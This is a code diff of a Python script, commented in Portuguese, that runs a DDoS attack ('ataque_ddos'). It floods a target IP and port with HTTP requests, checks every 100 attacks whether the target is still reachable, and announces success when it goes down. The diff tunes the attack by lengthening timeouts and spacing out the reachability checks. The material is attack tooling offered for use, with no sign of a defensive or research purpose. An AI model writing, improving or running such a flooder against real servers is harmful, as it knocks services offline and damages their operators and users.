@@ -6,8 +6,8 @@ import time
 def send_request(ip, porta, attack_number):
     url = f"http://{ip}:{porta}"
     try:
-        # Enviando requisição HTTP com timeout de 5 segundos
-        response = requests.get(url, timeout=5)
+        # Enviando requisição HTTP com timeout de 10 segundos (aumentado para garantir que o servidor tenha tempo)
+        response = requests.get(url, timeout=10)
         
         # Verificando o código de status da resposta
         if response.status_code == 200:
@@ -48,15 +48,16 @@ def ataque_ddos(ip, porta):
             print(f"Erro inesperado: {e}")
             break
 
-        # Checar se o destino ainda está acessível
-        try:
-            response = requests.get(f"http://{ip}:{porta}", timeout=5)
-            if response.status_code != 200:
+        # Checar se o destino ainda está acessível a cada 100 ataques
+        if attack_number % 100 == 0:
+            try:
+                response = requests.get(f"http://{ip}:{porta}", timeout=10)  # Timeout maior
+                if response.status_code != 200:
+                    print(f"O destino {ip}:{porta} caiu ou está inacessível. Ataque concluído com sucesso!")
+                    break
+            except requests.exceptions.RequestException:
                 print(f"O destino {ip}:{porta} caiu ou está inacessível. Ataque concluído com sucesso!")
                 break
-        except requests.exceptions.RequestException:
-            print(f"O destino {ip}:{porta} caiu ou está inacessível. Ataque concluído com sucesso!")
-            break
 
     print("Ataque finalizado.")
 
